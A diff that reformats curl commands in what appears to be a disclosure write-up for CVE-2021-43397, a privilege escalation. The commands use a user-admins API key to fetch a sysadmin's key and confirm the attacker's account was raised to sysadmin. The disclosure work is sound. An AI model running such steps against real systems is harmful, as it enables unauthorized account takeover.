@@ -32,9 +32,7 @@ This vulnerability was credited by MITRE with id: [CVE-2021-43397](https://cve.m
 2. Get a sysadmins' API key
     ```bash
     cURL Request:
-    curl -s -X GET --user "[user-admins_user_API_key]:x" -H "Accept:
-    application/json" -H "Content-Type: application/json" https://
-    [CENSORED]/admin/users
+    curl -s -X GET --user "[user-admins_user_API_key]:x" -H "Accept: application/json" -H "Content-Type: application/json" https://[CENSORED]/admin/users
 
     Response:
     [TRUNCATED]
@@ -105,9 +103,7 @@ This vulnerability was credited by MITRE with id: [CVE-2021-43397](https://cve.m
 4. Verify that your own user-admins user is now a sysadmins one.
     ```bash
     cURL Request
-    curl -X GET -H "Accept: application/json" -H "Content-Type:
-    application/json" --user [user-admins_user_API_key]:x https://
-    [CENSORED]/admin/users/<user-admins_user_id>
+    curl -X GET -H "Accept: application/json" -H "Content-Type: application/json" --user [user-admins_user_API_key]:x https://[CENSORED]/admin/users/<user-admins_user_id>
 
     Response
     {"user":
